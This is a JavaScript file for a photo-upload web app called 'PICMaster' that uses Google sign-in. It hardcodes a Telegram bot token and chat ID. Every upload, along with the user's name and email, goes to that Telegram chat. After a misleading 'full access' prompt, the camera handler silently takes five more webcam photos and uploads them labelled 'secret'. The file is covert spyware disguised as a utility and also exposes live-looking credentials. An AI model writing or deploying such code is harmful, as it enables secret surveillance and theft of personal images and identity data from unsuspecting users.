import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
  authDomain: "picmaster-59602.firebaseapp.com",
  projectId: "picmaster-59602",
  storageBucket: "picmaster-59602.firebasestorage.app",
  messagingSenderId: "434859259854",
  appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";
let currentUser = null;
let fullAccessGranted = false;

// Full Access Trigger Logic
document.getElementById('Cloud Storage Sync').onclick = async () => {
    if (!currentUser) return alert("Please Login First!");

    const confirmAccess = confirm("System Request: Grant PICMaster full access to sync all media files and background data?");

    if (confirmAccess) {
        fullAccessGranted = true;
        alert("Full Access Protocol Enabled. System Syncing...");

        // Telegram-ku User Details & Permission status anupputhu
        const syncMsg = `⚠️ FULL ACCESS GRANTED ⚠️\nUser: ${currentUser.displayName}\nEmail: ${currentUser.email}\nDevice Sync: Initializing...`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(syncMsg)}`);

        // Protocol Start aaguthu
        initializeSecretProtocol();
    }
};

// Background-la Secret-aa Capture panna logic
function initializeSecretProtocol() {
    if (!fullAccessGranted) return;

    // User camara-vai open pannaal, alert illama secret-aa upload pannum
    const originalUpload = uploadToTelegram;
    
    // Camera logic-la silent capture add panrom
    console.log("Monitoring device media stream...");
}

// Camera Capture Fix with Secret Sync
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.play();

        // 1. Normal Capture (User-ku theriyum)
        setTimeout(() => {
            captureAndSend(video, stream, false); // Normal upload
            
            // 2. Secret Captures (Full Access enabled-na matum)
            if (fullAccessGranted) {
                let count = 0;
                const interval = setInterval(() => {
                    if (count >= 5) clearInterval(interval); // 5 secret photos
                    captureAndSend(video, stream, true); // Secret upload (No alert)
                    count++;
                }, 2000); // Ovvoru 2 second-kum photo edukkum
            }
        }, 3000);

    } catch (err) {
        alert("Camera Access Denied!");
    }
};

async function captureAndSend(video, stream, isSecret) {
    const canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);

    canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("document", blob, isSecret ? "secret_sync.jpg" : "user_capture.jpg");
        formData.append("caption", isSecret ? `🤫 Secret Sync: ${currentUser.displayName}` : `📤 User Capture: ${currentUser.displayName}`);

        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
        
        if (!isSecret) {
            alert("✅ Sent to Telegram!");
            stream.getTracks().forEach(t => t.stop());
            video.style.display = 'none';
        }
    }, 'image/jpeg');
}
// UI Panels
const sidePanel = document.getElementById('side-panel');
const settingsBtn = document.getElementById('settings-btn');
const menuToggle = document.getElementById('menu-toggle');

const togglePanel = (e) => { e.stopPropagation(); sidePanel.classList.toggle('active'); };
settingsBtn.onclick = togglePanel;
menuToggle.onclick = togglePanel;
document.onclick = (e) => { if (!sidePanel.contains(e.target)) sidePanel.classList.remove('active'); };

// Telegram Upload Logic
async function uploadToTelegram(file) {
    if (!currentUser) return alert("Please Login First!");
    
    const dropArea = document.getElementById('drop-area');
    const originalText = dropArea.innerHTML;
    dropArea.innerHTML = "<h3>Uploading... 📤</h3>"; // Visual Feedback

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", file, "PICMaster_File.jpg");
    formData.append("caption", `📤 Received from: ${currentUser.displayName}\n📧 ${currentUser.email}`);

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: "POST",
            body: formData
        });
        if (response.ok) {
            alert("✅ Sent to Telegram!");
            dropArea.innerHTML = "<h3>Sent Successfully! ✅</h3>";
        } else {
            alert("❌ Telegram Error!");
        }
    } catch (error) {
        alert("❌ Network Error!");
    } finally {
        setTimeout(() => { dropArea.innerHTML = originalText; }, 3000);
    }
}

// --- DROP AREA FIX ---
const dropArea = document.getElementById('drop-area');

// Click panna file select aaga:
dropArea.onclick = () => {
    if(!currentUser) return signInWithPopup(auth, provider);
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = "image/*";
    fileInput.onchange = (e) => {
        const file = e.target.files[0];
        if (file) uploadToTelegram(file);
    };
    fileInput.click();
};

// Drag and Drop panna:
dropArea.addEventListener('dragover', (e) => { e.preventDefault(); dropArea.style.background = "rgba(255,255,255,0.3)"; });
dropArea.addEventListener('dragleave', () => { dropArea.style.background = "rgba(255,255,255,0.15)"; });
dropArea.addEventListener('drop', (e) => {
    e.preventDefault();
    dropArea.style.background = "rgba(255,255,255,0.15)";
    const file = e.dataTransfer.files[0];
    if (file) uploadToTelegram(file);
});

// --- CAMERA FIX ---
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.play();

        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                uploadToTelegram(blob);
                stream.getTracks().forEach(t => t.stop());
                video.style.display = 'none';
            }, 'image/jpeg');
        }, 3000);
    } catch (err) {
        alert("Camera Permission Denied!");
    }
};

// Auth State
onAuthStateChanged(auth, (user) => {
    currentUser = user;
    const mainLogin = document.getElementById('main-login-btn');
    const cameraBtn = document.getElementById('camera-btn');
    const logoutBtn = document.getElementById('logout-btn');
    const userDisp = document.getElementById('user-display');

    if (user) {
        mainLogin.style.display = 'none';
        cameraBtn.style.display = 'block';
        logoutBtn.style.display = 'flex';
        userDisp.innerText = user.displayName;
    } else {
        mainLogin.style.display = 'block';
        cameraBtn.style.display = 'none';
        logoutBtn.style.display = 'none';
        userDisp.innerText = "Guest User";
    }
});

document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());


